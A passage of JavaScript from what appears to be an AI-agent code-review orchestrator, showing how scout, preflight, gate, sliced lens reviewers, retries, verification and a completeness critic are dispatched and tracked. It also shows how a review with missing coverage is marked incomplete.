  // means "a review step did not happen; re-run it". A dead scout satisfies that: the plan
  // degrades to the conservative fallback and the scouted intent is genuinely lost. A dead
  // preflight loses no coverage — every fact it resolves is re-established by the gate, and
  // preflightBrief() tells the gate to do exactly that. It costs time, not signal. Marking such a
  // run INCOMPLETE would flag a pure performance fallback as an unfinished review and dilute the
  // marker for the cases that mean it. The loss stays visible where it belongs: this log line and
  // `preflight.status: 'unavailable'` in the run record.
}
return { preflight, probeViolations }
}

/** @param {Profile} profile @param {Preflight} preflight */
function preflightLine(profile, preflight) {
  return `[${profile.id}] Preflight: runner ${preflight.runner ? `\`${preflight.runner.trim()}\`` : '(none)'}`
    + ` · ${preflight.blockers?.length ? `${preflight.blockers.length} compile blocker(s)` : 'no compile blockers'}`
    + ` · CI covers ${preflight.ciCovers?.length ? preflight.ciCovers.join(', ') : 'nothing'}`
    + `${preflight.missingTools?.length ? ` · missing: ${preflight.missingTools.join(', ')}` : ''}`
    + `${preflightIsPartial(preflight) ? ' · ⚠️ PARTIAL — see notes' : ''}`
}

/** @param {GateAnswer | null} gate */
function gateFields(gate) {
  return {
    gateStatus: gate?.status ?? 'unknown',
    gateProvenance: gate?.provenance ?? 'gate not established',
    failedChecks: gate?.failedChecks ?? [],
    // Red, real, and NOT this diff's doing. Kept out of failedChecks so it cannot stop the review, and
    // out of notes so it cannot be quietly lost: it prints on every verdict, including a green one.
    carriedChecks: gate?.carriedChecks ?? [],
  }
}

/** @param {GateAnswer | null} gate */
function gateSeedFindings(gate) {
  return (gate?.seedFindings ?? []).map((/** @type {Finding} */ f) => ({ ...f, source: f['source'] || 'tool' }))
}

/** @param {Profile} profile @param {string} gateStatus @param {string} gateProvenance @param {string[]} failedChecks @param {string[]} carriedChecks */
function logGate(profile, gateStatus, gateProvenance, failedChecks, carriedChecks) {
  log(`[${profile.id}] Gate: ${gateStatus} — ${gateProvenance}${failedChecks.length ? ` · failed: ${failedChecks.join(', ')}` : ''}${carriedChecks.length ? ` · ${carriedChecks.length} pre-existing (carried, not blocking)` : ''}`)
}

/** @param {string} gateProvenance @param {Preflight | null} preflight */
function toolProvenanceFor(gateProvenance, preflight) {
  // What a VERIFIER needs to run a tool, as opposed to what the RECORD needs to explain the gate.
  // Kept separate so the preflight's runner prefix never leaks into the persisted provenance string.
  return [
    gateProvenance,
    preflight?.runner ? `run every tool as \`${flattenField(preflight.runner).trim()} <cmd>\` — bare invocations die in missing system libraries` : '',
    preflight?.blockers?.length ? `CANNOT compile here: ${preflight.blockers.map(flattenField).join('; ')} — a tool needing a build is unrunnable, say so rather than reporting its error as evidence` : '',
  ].filter(Boolean).join(' · ')
}

/** The preflight as the plan checkpoint records it. @param {Preflight | null} preflight @param {string[]} probeViolations */
function preflightCheckpoint(preflight, probeViolations) {
  return preflight
    ? { status: preflightIsPartial(preflight) ? 'partial' : 'ok', runner: preflight.runner, blockers: preflight.blockers, missingTools: preflight.missingTools, ciCovers: preflight.ciCovers, notes: preflight.notes, probeViolations }
    : { status: 'unavailable' }
}

/** @param {Profile} profile */
async function reviewProfile(profile) {
  // ---- Scout ----
  const scout = await ragent(scoutPrompt(profile), { label: `scout:${profile.id}`, schema: SCOUT_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' })
  // A dead/timed-out scout falls back to the CONSERVATIVE plan (all lenses, security floor → 3-vote),
  // never a permissive one — but it must not read as a successful classification either: the fallback
  // loses the scouted intent, churn and size, so it is logged loudly and carried into `notRun` so the
  // verdict says INCOMPLETE rather than a clean Approve.
  const scoutFailed = !scout
  const scoutNotRun = scoutFailed
    ? [`${profile.id} scout classification — the plan is the conservative fallback (all lenses, 3-vote, 2 rounds), not a scouted one`]
    : []
  const { plan, surfaceDropped } = planFromScout(profile, scout)
  // Only the UNIVERSE is recorded here: which optional lenses this profile could have bought. It rides
  // back on the profile's result; what ran is recorded at dispatch (`runLens`) and subtracted by
  // `optionalTally()`, because the plan is not final at this point — see the tally's definition.
  const optionalScope = profile.lenses.filter((/** @type {string} */ l) => OPTIONAL_LENSES.includes(l))
  logScoutPlan(profile, scout, plan)

  // Lens runner: prefer the profile's dedicated reviewer agent; if that agent type is not
  // registered in this session (stale plugin registry), fall back to the generic workflow
  // subagent — lens prompts are self-contained. The miss is LEARNED once (reviewerAgentMissing):
  // without it the absent agent type is re-attempted on every lens × round, which floods the run
  // with "agent type '<x>' not found". Both failure shapes are handled — a thrown /not found/ and
  // a null return (some runtimes signal an unknown agent type that way). Record the real failure
  // reason so INCOMPLETE reporting doesn't have to guess (budget vs registry vs death).
  /** @type {Map<string, string>} */
  const lensFailures = new Map()
  let reviewerAgentMissing = false
  // Keyed by DISPATCH, not by lens name. Once a lens fans out over slices there are several live
  // dispatches under one name, and a name-keyed map keeps only the last failure — so the reported
  // reason would name one slice's error as if it were the lens's.
  const dispatchKey = (/** @type {string} */ lens, /** @type {Slice | null} */ slice) => (slice ? `${lens} :: ${slice.key}` : lens)
  // An answer is model output: the schema shapes it, but an off-schema answer still arrives. One
  // without a findings array did not review — counting it as returned would read `{}` as a clean lens
  // and iterate a string or a number as findings. It is a lens failure with its own reason, so every
  // caller (the round, the resurrection sweep, the critic follow-ups) sees exactly what a dead lens is.
  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] @returns {Promise<FindingsAnswer | null>} */
  async function runLens(lens, prompt, phaseName, labelSuffix, slice = null) {
    const res = await dispatchLens(lens, prompt, phaseName, labelSuffix, slice)
    if (res != null && !Array.isArray(/** @type {{ findings?: unknown }} */ (res).findings)) {
      lensFailures.set(dispatchKey(lens, slice), 'answered off-schema (no findings array)')
      log(`⚠️ [${profile.id}] lens ${dispatchKey(lens, slice)} answered off-schema (no findings array) — counted as not returned`)
      return null
    }
    return res
  }
  // A fallback counts as answered only when runLens would accept it: an off-schema answer is a dead lens.
  const answeredFindings = (/** @type {unknown} */ r) => r != null && Array.isArray(/** @type {{ findings?: unknown }} */ (r).findings)
  /** @param {string} lens @param {string} prompt @param {string} phaseName @param {string} labelSuffix @param {Slice | null} [slice] */
  async function dispatchLens(lens, prompt, phaseName, labelSuffix, slice = null) {
    noteLensDispatched(lens)
    const opts = { label: `lens:${profile.id}:${lens}${labelSuffix}`, phase: phaseName, schema: FINDINGS_SCHEMA, model: plan.lensModel }
    const runGeneric = async () => {
      try {
        return await ragent(prompt, opts)
      } catch (e) {
        lensFailures.set(dispatchKey(lens, slice), String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 160))
        return null
      }
    }
    if (reviewerAgentMissing) return runGeneric()
    try {
      const res = await ragent(prompt, { ...opts, agentType: profile.reviewerAgent })
      if (res != null) return res
      // Null (not a throw) from the reviewer path: on some runtimes an unknown agent type returns
      // null rather than throwing. ragent already retried; try the generic subagent once. Do NOT
      // set reviewerAgentMissing — a null can be a transient API death, so later lenses still get
      // a shot at the real reviewer agent. Counted, so the report can say it happened — only when the
      // generic subagent answered: dead on both paths is a dead lens, as rust-audit counts it (#116).
      const fallback = await runGeneric()
      if (answeredFindings(fallback)) noteReviewerAgentFallback(profile)
      return fallback
    } catch (e) {
      return reviewerAgentThrew(e, lens, slice, runGeneric)
    }
  }

  // The reviewer-agent dispatch threw: an unregistered agent type routes this and every later lens to
  // the generic subagent; any other error is this dispatch's failure, retried generically only when it reads /not found/.
  /** @param {unknown} e @param {string} lens @param {Slice | null} slice @param {() => Promise<FindingsAnswer | null>} runGeneric */
  async function reviewerAgentThrew(e, lens, slice, runGeneric) {
    const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
    // dispatchKey, like the other write to this map. Keyed by bare name the real error message was
    // looked up under a key nobody uses, so a sliced dispatch that died WITH a reason was reported
    // as "died without an error" — and any sibling slice could overwrite it.
    if (!isAgentTypeMissing(msg, profile.reviewerAgent)) {
      // Recorded first, so a generic run that also returns nothing still reports this error (a generic
      // throw overwrites it with its own). Not memoized: a real unregistered type in unknown wording
      // costs one failed agent dispatch per lens — the price of not guessing at the text (#116).
      lensFailures.set(dispatchKey(lens, slice), msg.slice(0, 160))
      if (!/not found/i.test(msg)) return null
      const fallback = await runGeneric()
      if (answeredFindings(fallback)) { lensFailures.delete(dispatchKey(lens, slice)); noteReviewerAgentNotFound(profile, msg.slice(0, 160)) }
      return fallback
    }
    reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
    log(`⚠️ [${profile.id}] agent type '${profile.reviewerAgent}' not registered here — routing remaining lenses to the generic subagent`)
    return await runGeneric()
  }

  // ---- Preflight ----
  const { preflight, probeViolations } = await runPreflight(profile)

  // ---- Gate ----
  const gate = await ragent(profile.gate({ baseRef, isLibrary: plan.isLibrary, securitySensitive: plan.securitySensitive, preflight }),
    { label: `gate:${profile.id}`, schema: GATE_SCHEMA, phase: 'Gate', effort: 'medium' })
  const { gateStatus, gateProvenance, failedChecks, carriedChecks } = gateFields(gate)
  const seedFindings = gateSeedFindings(gate)
  logGate(profile, gateStatus, gateProvenance, failedChecks, carriedChecks)
  const toolProvenance = toolProvenanceFor(gateProvenance, preflight)
  // First checkpoint: from here on, a run that dies still says what was planned and whether the tree
  // was green. Everything before this point is cheap to redo; everything after it is not.
  // `head` is the RUN'S HEAD, the same value the final record carries, and the diff base rides under
  // its own `baseRef` key. Both once shared the `head` key — the checkpoints got the base (a ref NAME
  // like `origin/main`) while the final record got the sha — so the two sides of every
  // checkpoint↔record comparison spelled the field differently: `finalizeRun` folded 0 phases and
  // left the `.partial` directory behind, and `recover` then read a ref name as a commit and promoted
  // the leftover as a separate partial run. Two keys, each meaning one thing.
  //
  // `round` rides on every checkpoint for one reason: `recover` promotes an unfinalized directory
  // into a real record and DELETES the directory, and a record with no round is indexed as round 0 —
  // so one repair permanently reset the chain to a first review. The round number is knowable only
  // here, by the run itself; nothing downstream can reconstruct it.
  await checkpoint(`${profile.id}-plan`, {
    language: profile.id, branch, head, baseRef, round: thisRound,
    scout: { size: plan.sizeBucket, lenses: plan.lenses, maxRounds: plan.maxRounds, verifyVotes: plan.verifyVotes, securitySensitive: plan.securitySensitive },
    gate: { status: gateStatus, provenance: gateProvenance, failedChecks, carriedChecks, seeds: seedFindings.length },
    // `status` so a reader of the record can tell a preflight that ran and found nothing from one
    // that never answered — a bare `null` collapsed both into the same, more permissive, reading.
    preflight: preflightCheckpoint(preflight, probeViolations),
  }, 'Gate')
  if (gateStatus === 'fail') {
    return { profile, plan, surfaceDropped, optionalScope, ranLenses: /** @type {string[]} */ ([]), lensRounds: [], gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun: [...scoutNotRun], criticNotes: '', probeViolations }
  }

  // ---- Probe reviewer-agent availability ONCE up front ----
  // The per-lens fallback (runLens) already recovers, but it learns the miss only after the FIRST
  // attempt — and the round-1 lenses fan out in parallel, so without this every lens in round 1
  // would fail with "agent type '<x>' not found" before the memo is set. One cheap probe collapses
  // that opening wave to a single attempt. Best-effort: only a thrown /not found/ marks it missing;
  // a result, a null, or an unrelated error leaves the per-lens fallback to decide.
  await probeReviewerAgent()

  // The probe: only a thrown /not found/ marks the reviewer agent missing.
  async function probeReviewerAgent() {
    if (profile.reviewerAgent && !reviewerAgentMissing) {
      try {
        await agent('Reply with the single word: OK.', { label: `probe:${profile.id}`, phase: 'Gate', model: 'haiku', effort: 'low', agentType: profile.reviewerAgent })
      } catch (e) {
        const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
        if (isAgentTypeMissing(msg, profile.reviewerAgent)) {
          reviewerAgentMissing = true; noteReviewerAgentMissing(profile, msg)
          log(`[${profile.id}] reviewer agent '${profile.reviewerAgent}' not registered — all lenses will use the generic subagent`)
        }
      }
    }
  }

  // ---- Lenses (loop-until-dry) ----
  phase('Lenses')
  /** @type {Set<string>} */
  const seen = new Set()
  /** @type {Finding[]} */
  const pool = []
  for (const f of seedFindings) { const k = key(f); if (!seen.has(k)) { seen.add(k); pool.push(f) } }
  const notRun = [...scoutNotRun]
  // ONE coverage ledger, counted over DISPATCHES. There used to be a second, `ranAtLeastOnce`, and
  // after the dispatch accounting landed it was written twice and read nowhere — dead state whose
  // comment still claimed a role, which is how a reader comes to believe there are two ledgers that
  // might disagree. A dispatch that was expected and never came back is a hole whatever its
  // siblings did, and that is the whole of it.
  /** @type {Set<string>} */
  const expectedDispatches = new Set()
  /** @type {Set<string>} */
  const returnedDispatches = new Set()
  /** @type {Array<{ round: number, agents: number, returned: number, newFindings: number }>} */
  const lensRounds = []
  // Lenses the completeness critic added and that were dispatched — on the record, because they change
  // what a round cost without changing its plan (lib/round-pairs.mjs compares them, realm #97).
  /** @type {string[]} */
  let criticFollowupLenses = []
  // Computed ONCE for the whole profile, not per round: the changed-file set does not move between
  // rounds, and re-slicing per round would let a lens's slice key drift between round 1 and round 2
  // for no reason a reader could follow in the transcript.
  // ALL changed files go in, with the profile asked INSIDE. Filtering to the profile first would
  // drop the manifest and the lockfile before slicing, and a slice that cannot see the manifest
  // cannot tell that a shipped CRD lacks the field the code writes.
  const diffSlices = sliceDiff(changedFiles, { owns: f => profile.detect([f]) })
  if (diffSlices.length) log(`[${profile.id}] diff sliced into ${diffSlices.length} scope(s) for the code-intrinsic lenses: ${diffSlices.map(g => `${g.key} (${g.files.length})`).join(' · ')}. Whole-diff lenses (${WHOLE_DIFF_LENSES.join(', ')}) still see everything.`)
  // `[null]` means "one dispatch, unsliced" — the shape the caller had before slicing existed, so
  // the unsliced path stays the same code rather than a branch that can drift from it.
  const lensSlicesFor = (/** @type {string} */ lens) => (diffSlices.length && sliceableLens(lens) ? diffSlices : [null])
  // One round of the lens loop; true when it surfaced nothing new (the loop is dry).
  /** @param {number} round */
  async function lensRound(round) {
    const priorSummary = priorFoundSummary(pool)
    // EXPECTED is built from the same expression that dispatches, so the two cannot drift. What a
    // lens fanned out into is now the unit of coverage: before slicing, a lens either ran or did
    // not, and a death forced INCOMPLETE. With six slices per lens, five could die while one
    // returned — and a name-keyed "did this lens run" answers yes, `droppedLenses` comes back
    // empty, and the run reports an ordinary verdict over five sixths of a diff that no lens of
    // that kind ever read. Slicing multiplies the chances of losing coverage by the slice count, so
    // the accounting has to be per slice or the whole partition is a way of hiding holes.
    const dispatches = plan.lenses.flatMap(lens => lensSlicesFor(lens).map(slice => ({ lens, slice })))
    for (const d of dispatches) expectedDispatches.add(dispatchKey(d.lens, d.slice))
    // WINDOWED, for the same measured reason verification is. Slicing turns a wave of a dozen lenses
    // into one of ~70, and an unwindowed wave that size makes agents queue — while the Lenses
    // deadline clocks from DISPATCH, so the wait is inside it and it fires on healthy agents that
    // did nothing but stand in line. Applying the mitigation this file already documents for this
    // exact shape, rather than discovering it again.
    const settled = await weightedWindow(
      dispatches.map(d => ({ weight: 1, run: () => runLens(d.lens, lensPrompt(d.lens, priorSummary, profile, plan, d.slice), 'Lenses', ` r${round}${d.slice ? ` ${d.slice.key}` : ''}`, d.slice) })),
      LENS_WINDOW_AGENTS,
      (run, i) => run().then(r => (r ? { ...r, __key: dispatchKey(/** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens, /** @type {(typeof dispatches)[number]} */ (dispatches[i]).slice), __lens: /** @type {(typeof dispatches)[number]} */ (dispatches[i]).lens } : null)),
    )
    const results = settled.filter(r => r != null)
    // `__lens`, not the model's `lens` field. Coverage already avoided trusting it; the finding's
    // `source` and the ran-set did not, and a dispatch answering with a mangled name sent its
    // findings to `source: 'unknown'` while its dimension row read `ran: true` with zero findings —
    // the yield inversion `ranLenses` exists to prevent, arriving one field over.
    for (const r of results) returnedDispatches.add(r.__key)
    const fresh = []
    for (const r of results) {
      for (const f0 of (r.findings || [])) {
        const f = { ...f0, source: r.__lens }
        const k = key(f)
        if (!seen.has(k)) { seen.add(k); fresh.push(f) }
      }
    }
    pool.push(...fresh)
    // Per-round yield, persisted to the run record. Lenses are the other half of a review's cost
    // (182 min / 31 agents on a measured run) and every round re-runs EVERY lens over the whole
    // diff, but whether round 2 earns that is unknowable after the fact: the gate's seed findings
    // make the pool non-empty from round 1, so a transcript cannot be split by round. Record it
    // rather than guess — a later `maxRounds` cut should be argued from these numbers.
    // ONE LINK THE "a finding cannot be lost" CHAIN DID NOT HAVE, recorded here because this is where
    // a reader looks for it. `if (!fresh.length) dry = true` below ends the search, and the
    // ALREADY-FOUND cap (priorFoundSummary) makes a withheld entry MORE likely to be re-surfaced:
    // `seen` drops it as a duplicate, `fresh` comes back empty, the round reads as dry and the loop
    // stops. No finding is lost — the pool keeps every entry and priors are adjudicated on their own
    // track — but the SEARCH can end a round early, and `newFindings` here (the very number a later
    // `maxRounds` cut would be argued from) is biased downward by the same mechanism.
    // Deliberately NOT fixed: a re-surfaced duplicate is indistinguishable from a genuinely dry round
    // at this point, so "dry unless something new that is not a known duplicate" would mean splitting
    // the `seen` key set by provenance and paying an extra full round of lens cost — against a prompt
    // saving that is about 1.8% of what the lens agents read. So do not read a dry round as proof the
    // diff is exhausted, and do not argue a round cut from `newFindings` alone.
    // `agents` is what was DISPATCHED this round, which with slicing is lenses × slices and no
    // longer the lens count. Left as `plan.lenses.length` it undercounted, so `returned` could
    // exceed it and any death accounting downstream read inverted — and this is the field that
    // makes a lost slice visible in the record at all.
    lensRounds.push({ round, agents: dispatches.length, returned: results.length, newFindings: fresh.length })
    log(`[${profile.id}] Lenses round ${round}: +${fresh.length} new (pool ${pool.length})`)
    return !fresh.length
  }
  let dry = false
  for (let round = 1; round <= plan.maxRounds && !dry; round++) dry = await lensRound(round)

  // ---- Resurrection sweep ----
  // A lens agent occasionally returns null on a transient API death / connection drop. That
  // dispatch is then counted as a hole in the ledger, and a hole alone marks the whole review
  // INCOMPLETE — even when the surviving
  // lenses found plenty. Since the failure is transient, a targeted retry of ONLY the missing lenses
  // recovers most of them. Bounded to 2 extra attempts; re-uses the same runLens/lensPrompt path.
  // MISSING IS NOW A DISPATCH QUESTION. A lens that lost one slice of six is not recovered by the
  // fact that its other five returned, so the sweep must see it — and the retry it sends is
  // deliberately UNSLICED, which is why recovering it restores the lens's whole coverage below.
  const lensesWithHoles = () => plan.lenses.filter(l => [...expectedDispatches].some(k => (k === l || k.startsWith(`${l} :: `)) && !returnedDispatches.has(k)))
  // A resurrected lens's answer: its holes closed, its new findings pooled.
  /** @param {FindingsAnswer & { __lens: string }} r */
  function absorbResurrected(r) {
    const lens = r.__lens
    // A resurrection dispatch carries NO slice, so it reviewed the whole diff — which is exactly
    // what closes every hole this lens had. Marking only the lens name would leave the per-slice
    // ledger still reporting holes that were just filled, and the run would claim INCOMPLETE over
    // coverage it actually has.
    for (const k of expectedDispatches) if (k === lens || k.startsWith(`${lens} :: `)) returnedDispatches.add(k)
    for (const f0 of (r.findings || [])) {
      const f = { ...f0, source: lens }
      const k = key(f)
      if (!seen.has(k)) { seen.add(k); pool.push(f) }
    }
  }
  async function resurrectionSweep() {
    let missing = lensesWithHoles()
    for (let sweep = 1; sweep <= 2 && missing.length; sweep++) {
      log(`[${profile.id}] Resurrection sweep ${sweep}: retrying ${missing.length} lens(es) that never returned (${missing.join(', ')})`)
      const priorSummary = priorFoundSummary(pool)
      // Carries the lens it DISPATCHED alongside the answer. Everywhere else this accounting refuses
      // to trust the model-returned `lens` field, and here it was still being trusted: a resurrection
      // that succeeded but answered with a missing or mangled `lens` closed no holes, so the sweep
      // kept seeing them, both attempts were spent, and the run reported INCOMPLETE over coverage it
      // actually had. A false hole that cannot be cleared is as much a lie as a hidden one.
      const attempts = missing.map(lens => ({ lens }))
      const settled = await parallel(attempts.map(a => () =>
        runLens(a.lens, lensPrompt(a.lens, priorSummary, profile, plan), 'Lenses', ` resurrect${sweep}`)
          .then(r => (r ? { ...r, __lens: a.lens } : null)),
      ))
      const results = settled.filter(r => r != null)
      for (const r of results) absorbResurrected(r)
      missing = lensesWithHoles()
    }
  }
  await resurrectionSweep()

  // DERIVED by subtraction from what was dispatched, never from a list built beside it. A lens whose
  // every slice returned contributes nothing here; a lens that lost one slice of six is reported as
  // losing that slice, by name, because "safety ran" is true and useless when five sixths of the
  // diff got no safety review.
  // The dispatches that never returned, each with its reason, carried into notRun and the log.
  function reportDroppedLenses() {
    const droppedLenses = [...expectedDispatches].filter(k => !returnedDispatches.has(k))
    if (droppedLenses.length) {
      // Falls back to the BARE lens name, because the resurrection sweep dispatches unsliced and can
      // only key its failure that way. Without the fallback every sliced hole read "died without an
      // error" even when the retry died with a captured message — losing the diagnosis for exactly
      // the sliced case, which is what keying by dispatch was introduced to fix.
      const reasonFor = (/** @type {string} */ k) => lensFailures.get(k) || lensFailures.get(k.split(' :: ')[0] ?? k) || 'returned no result (skipped or died without an error)'
      const reasons = droppedLenses.map(k => `${k}: ${reasonFor(k)}`).join(' · ')
      notRun.push(`${profile.id} lenses that never returned — ${reasons}`)
      log(`⚠️ [${profile.id}] ${droppedLenses.length} lens dispatch(es) never returned (${reasons}). Review marked INCOMPLETE.`)
    }
    return droppedLenses
  }
  const droppedLenses = reportDroppedLenses()
  // `ranLenses` rides along to the record: the dimension rows are built from plan.lenses, so a lens
  // that never returned still gets a row reading 0 findings — indistinguishable from a lens that ran
  // and found nothing. That is the difference between "redundant, consider dropping it" and "broken,
  // fix it", and the yield analysis inverts on it.
  // FULLY ran, not "ran at all". A lens that returned one slice of six covered a sixth of the diff,
  // and a dimension row built from the looser test presents its partial findings as whole-diff
  // coverage — "safety ran" is true and useless, which is exactly the phrasing the accounting above
  // rejects. The verdict is already saved by `droppedLenses`; this is the reader's fidelity.
  const ranLenses = plan.lenses.filter(l => [...expectedDispatches].every(k => (k !== l && !k.startsWith(`${l} :: `)) || returnedDispatches.has(k)))
  // The lens phase is the expensive half of a review and the half most often lost: on the run that
  // prompted this, verification died to a usage limit and took every lens's yield with it.
  // `branch`/`head` on every checkpoint, not only the first. `--rejoin` can be armed ONLY after a
  // checkpoint failed, so it is never armed on the `-plan` payload — and `-plan` was the only one
  // carrying identity. The rejoin search therefore saw `{project, '', ''}` on exactly the paths where
  // it fires, and matched on the repository alone: any concurrent review of the same repo qualified.
  await checkpoint(`${profile.id}-lenses`, {
    language: profile.id, branch, head, baseRef, round: thisRound, ranLenses, droppedLenses, lensRounds,
    candidates: summarizeFindings(pool),
    candidatesBySource: pool.reduce((m, f) => ({ ...m, [f.source || 'unknown']: (m[f.source || 'unknown'] || 0) + 1 }), /** @type {Record<string, number>} */ ({})),
    notRun,
  }, 'Lenses')
  if (!pool.length) {
    return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed: [], suspected: [], unverified: [], dropped: 0, notRun, criticNotes: '', probeViolations }
  }

  // ---- Verify ----
  phase('Verify')
  const deduped = await dedupPool(rollupPool(pool, profile), profile)
  let { confirmed, suspected, unverified, dropped, refuted, notRun: verifyNotRun, savedByFloor } = await verifyPool(deduped, plan, profile, toolProvenance)
  // Verification that never ran joins the lens-level list: a dead batch verifier is a hole in
  // coverage exactly like a lens that never returned, and both must reach the verdict as INCOMPLETE.
  notRun.push(...verifyNotRun)
  log(`[${profile.id}] Verify: ${confirmed.length} confirmed · ${suspected.length} suspected · ${dropped} refuted · ${unverified.length} not verified`)
  await checkpoint(`${profile.id}-verify`, {
    language: profile.id, branch, head, baseRef, round: thisRound,
    verdict: finalVerdict(confirmed),
    findings: summarizeFindings(confirmed),
    // `candidates` counts what verification EXAMINED, so the unverified tier is reported beside it
    // rather than inside it.
    verification: { candidates: deduped.length - unverified.length, confirmed: confirmed.length, suspected: suspected.length, refuted: dropped, unverified: unverified.length },
  }, 'Verify')

  // ---- Completeness critic (large or security-sensitive; budget-gated) ----
  phase('Synthesize')
  // The completeness critic, when the plan is large or security-sensitive and the budget allows it.
  async function completenessCritic() {
    const criticInScope = plan.sizeBucket === 'large' || plan.securitySensitive
    if (criticInScope && (!budget.total || budget.remaining() > 90000)) {
      await runCritic()
    } else if (criticInScope) {
      notRun.push(`${profile.id} completeness-critic`)
      log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] completeness critic. Review marked INCOMPLETE.`)
    }
  }
  async function runCritic() {
    const candidates = profile.lenses.filter((/** @type {string} */ l) => !plan.lenses.includes(l))
    const critic = await ragent(
      `You are a completeness critic for a ${profile.lang} review of the diff (base ${flattenField(baseRef) || 'HEAD'}).
Lenses already run: ${plan.lenses.join(', ')}. Confirmed: ${confirmed.length}, Suspected: ${suspected.length}.
Name any review lens that was NOT run but SHOULD be, given what the diff touches — choose ONLY from: ${JSON.stringify(candidates)}.
Also note in one line anything else likely missed (a changed file no finding touched, a claim left unverified). If coverage is complete, return missingLenses: [] and notes: "coverage complete".`,
      { label: `critic:${profile.id}`, phase: 'Synthesize', schema: CRITIC_SCHEMA, effort: 'low' },
    )
    criticNotes = critic?.notes ?? ''
    // `admittedLens()` gates HERE too, and this is the fourth road into the plan, not a redundant check:
    // `candidates` is by construction the lenses NOT selected, so the whole optional set is in it.
    // The critic is the same model whose hands this project deliberately took the spend out of
    // ("the scout classifies, the code budgets"); letting it re-order lenses on the synthesis phase
    // would return that spend through a side door and undo the boundary. The signal is not thrown
    // away — a refused name is carried to the reader as an uncovered surface, with how to buy it.
    const named = (critic?.missingLenses ?? []).filter((/** @type {string} */ l) => candidates.includes(l))
    const followups = refuseCriticNames(named)
    if (followups.length && (!budget.total || budget.remaining() > 60000)) {
      await criticFollowups(followups)
    } else if (followups.length) {
      notRun.push(`${profile.id} critic follow-up lenses (${followups.join('/')})`)
      log(`Budget low (~${Math.round(budget.remaining() / 1000)}k left) — SKIPPED [${profile.id}] critic follow-up lenses. Review marked INCOMPLETE.`)
    }
  }
  // The critic's names the optional request or the surface gate refuses, recorded as uncovered; the rest are follow-ups.
  /** @param {string[]} named @returns {string[]} */
  function refuseCriticNames(named) {
    for (const l of named) if (!admittedLens(l)) optionalNamedByCritic.add(l)
    const refusedOptional = named.filter((/** @type {string} */ l) => !admittedLens(l))
    if (refusedOptional.length) log(`[${profile.id}] Completeness critic named optional lens(es) ${refusedOptional.join(', ')} — NOT dispatched (the optional pass is bought by an explicit \`optional=\` request); reported as uncovered.`)
    // realm @nick/craft #102: the surface gate BINDS the critic too, mirroring `admittedLens()` above and
    // for the same reason. `candidates` is by construction the lenses NOT in the plan, so a lens the
    // gate dropped is in it — and re-dispatching it here would buy back exactly the whole-repo lens the
    // diff's absent surface said not to run, while `surfaceGateSection()` still reported it "not run"
    // (the report would then LIE). `surfaceDropped` is the PER-PROFILE drop list, so a lens dropped in
    // this profile does not wrongly suppress another profile's critic. A named-and-dropped lens is
    // refused, carried to the reader as an uncovered surface, and kept out of the follow-up set.
    for (const l of named) if (surfaceDropped.includes(l)) surfaceGateNamedByCritic.add(l)
    const refusedSurface = named.filter((/** @type {string} */ l) => surfaceDropped.includes(l))
    if (refusedSurface.length) log(`[${profile.id}] Completeness critic named surface-gated lens(es) ${refusedSurface.join(', ')} — NOT dispatched (the diff does not touch the surface their defect class needs); reported as uncovered.`)
    return named.filter((/** @type {string} */ l) => admittedLens(l) && !surfaceDropped.includes(l))
  }
  /** @param {string[]} followups */
  async function criticFollowups(followups) {
    log(`[${profile.id}] Completeness critic → follow-up lenses: ${followups.join(', ')}`)
    criticFollowupLenses = [...followups]
    const priorSummary = `Earlier lenses already produced ${pool.length} findings — do NOT repeat them; surface only what your lens would add.`
    // A SILENT REFUSAL NEXT TO A LOUD ONE. `.filter(Boolean)` used to swallow a follow-up lens that
    // DIED — no notRun entry, no INCOMPLETE — while the branch two lines below, where the same lens
    // is skipped for lack of budget, records both. "The critic said run it and it died" is not a
    // cleaner outcome than "the critic said run it and there was no budget"; it is the same hole in
    // coverage, and the one a re-run can actually fix.
    const settledExtra = await parallel(followups.map((/** @type {string} */ lens) => () =>
      runLens(lens, lensPrompt(lens, priorSummary, profile, plan), 'Synthesize', ' (critic)'),
    ))
    const deadFollowups = followups.filter((/** @type {string} */ _l, /** @type {number} */ i) => !settledExtra[i])
    if (deadFollowups.length) {
      notRun.push(...deadFollowups.map((/** @type {string} */ l) => `${profile.id} critic follow-up lens ${l} — dispatched and returned no findings (died, or answered off-schema)`))
      log(`⚠️ [${profile.id}] critic follow-up lens(es) ${deadFollowups.join('/')} died before returning findings — recorded as not run; the review is INCOMPLETE`)
    }
    const extra = settledExtra.filter(r => r != null).flatMap(r => r.findings || [])
    const fresh = extra.filter(f => { const k = key(f); if (seen.has(k)) return false; seen.add(k); return true })
    if (fresh.length) {
      const v = await verifyPool(await dedupPool(fresh, profile), plan, profile, toolProvenance)
      notRun.push(...(v.notRun || []))
      savedByFloor = savedByFloor.concat(v.savedByFloor || [])
      confirmed = confirmed.concat(v.confirmed)
      suspected = suspected.concat(v.suspected)
      unverified = unverified.concat(v.unverified)
      dropped += v.dropped
      refuted = refuted.concat(v.refuted)
      log(`[${profile.id}] Critic follow-up: +${v.confirmed.length} confirmed · +${v.suspected.length} suspected · ${v.dropped} refuted · +${v.unverified.length} not verified`)
    }
  }
  let criticNotes = ''
  await completenessCritic()

  return { profile, plan, surfaceDropped, optionalScope, ranLenses, lensRounds, criticFollowupLenses, gateStatus, gateProvenance, failedChecks, carriedChecks, confirmed, suspected, unverified, dropped, refuted, notRun, savedByFloor, criticNotes, probeViolations }
}

// ================= Run each active profile, then merge =================
async function reviewActiveProfiles() {
  for (const p of active) results.push(await reviewProfile(p))
}
await reviewActiveProfiles()

// A red gate on any active language blocks the whole review (findings can't be trusted on a broken tree).
const gateFailed = /** @type {Result[]} */ (failedProfiles(results))
const runGate = gateRecord(results)
const mergedProvenance = runGate.provenance
const mergedGateStatus = runGate.status

// carriedChecks prints on EVERY verdict, red or green. A red-but-not-yours check that only appeared
